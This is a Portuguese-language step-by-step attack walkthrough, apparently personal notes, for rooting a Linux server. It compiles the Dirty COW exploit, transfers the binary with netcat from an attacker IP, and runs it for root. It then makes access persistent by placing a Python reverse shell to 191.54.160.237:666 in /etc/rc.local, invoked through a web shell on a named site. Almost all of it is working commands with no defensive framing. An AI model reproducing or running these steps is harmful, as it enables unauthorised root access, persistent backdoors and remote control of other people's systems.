> ver a versão do kernel
```sh
uname -a
```

> https://dirtycow.ninja/

> https://github.com/securifera/cowcron/blob/master/cowcron.c

> compilar o codigo cowcron.c no linux
```sh
    wget https://raw.githubusercontent.com/securifera/cowcron/master/cowcron.c
    gcc -pthread cowcron.c -o cowcron
```
> Colocar o net cat em escuta

- do lado do atacante
```sh
    nc -lvp 666 < cowroot
```

- do lado da vitima
```php
    nc 191.54.160.237 666 > cowroot
```

> validar a Integridade com o md5sum
```sh
    md5sum cowroot
```

> dar permissão de execução
```sh
    chmod +x cowroot
```
> execucar o ficheiro
```sh
    ./cowroot
```

> Ok ja temos privilégios de super user, mas o servidor bloqueia passado pouco tempo. Então:

> Criar um script
- olhar o ficheiro rc.local

```cat /etc/rc.local ```

- copiar o ficheiro para home (estou nesse local)

```cp /etc/rc.local . ```

- Alterar o ficheiro - adicionar o comando para shel reversa
```sh
#####
# Texto que ja existe no documento
#####
bancocn.com/admin/uploads/cmd.php5?comando=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("191.54.160.237", 666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' & 

exit 0
```

- Criar um script _script.sh_
```sh
    mv rc.local /etc/rc.local
    chmod 755 /etc/rc.local
    chown root:root /etc/rc.local
```

- dar permissão de execução

``` 
    chmos +x script.sh 
```

- Executar o cowroot

``` 
    ./cowroot 
```

- Executar o script

``` 
    ./script.h 
```

- reboot
``` 
    reboot 
```
